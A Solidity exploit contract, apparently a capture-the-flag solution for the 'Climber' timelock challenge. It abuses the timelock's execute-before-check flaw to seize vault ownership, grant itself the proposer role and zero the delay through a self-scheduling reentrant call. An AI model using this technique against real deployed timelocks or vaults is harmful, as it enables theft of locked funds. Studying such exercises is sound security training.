// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ClimberTimelock.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "../ClimberConstants.sol";

contract MiddlemanClimber {
    function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt) external {
        // Recreate the scheduled operation from the Middle man contract and call the vault
        // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
        // This is leveraging the existing re-entrancy exploit in `execute`
        ClimberTimelock vaultTimelock = ClimberTimelock(payable(vaultTimelockAddress));
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        // set the attacker as the owner
        targets[0] = vaultAddress;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // set the attacker as the proposer
        targets[1] = vaultTimelockAddress;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",
            PROPOSER_ROLE, address(this));

        // set the delay to null
        targets[2] = vaultTimelockAddress;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // create the proposal
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",
            attacker, vaultAddress, vaultTimelockAddress, salt);

        vaultTimelock.schedule(targets, values, dataElements, salt);
    }
}